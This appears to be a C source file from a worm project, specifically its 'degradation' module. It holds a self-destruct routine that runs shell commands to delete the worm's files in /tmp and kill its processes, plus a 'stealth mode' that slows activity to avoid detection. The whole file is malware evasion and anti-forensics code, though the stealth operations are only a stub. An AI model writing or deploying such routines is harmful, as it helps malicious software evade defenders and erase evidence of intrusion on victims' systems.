#include "degradation.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>

// Cleanup files
void cleanup_files(void) {
    system("rm -f /tmp/worm* /tmp/*.b64 /tmp/worm.log 2>/dev/null");
}

// Cleanup processes
void cleanup_processes(void) {
    system("pkill -f 'worm' 2>/dev/null");
}

// Self-destruct: Clean exit, remove traces
void self_destruct(void) {
    printf("\n=== SELF-DESTRUCTION MODE ACTIVATED ===\n");
    printf("[!] CRITICAL RISK DETECTED - Initiating self-destruction sequence\n");
    printf("[!] Cleaning up processes...\n");
    
    cleanup_processes();
    
    printf("[!] Cleaning up files...\n");
    cleanup_files();
    
    printf("[!] Artifacts cleaned\n");
    printf("[!] Exiting...\n");
    exit(0);
}

// Perform stealth operations (minimal activity)
void perform_stealth_operations(void) {
    printf("[*] Performing stealth operations...\n");
}

// Enter stealth mode: Reduce activity, longer delays
void enter_stealth_mode(void) {
    printf("\n=== STEALTH MODE ACTIVATED ===\n");
    printf("[!] HIGH RISK DETECTED - Reducing activity to avoid detection\n");
    printf("[!] Increasing delays between operations\n");
    printf("[!] Avoiding noisy operations\n");
    perform_stealth_operations();
    printf("[*] Entering stealth delay (60 seconds)...\n");
    sleep(60);
    printf("[*] Stealth mode delay complete\n");
}

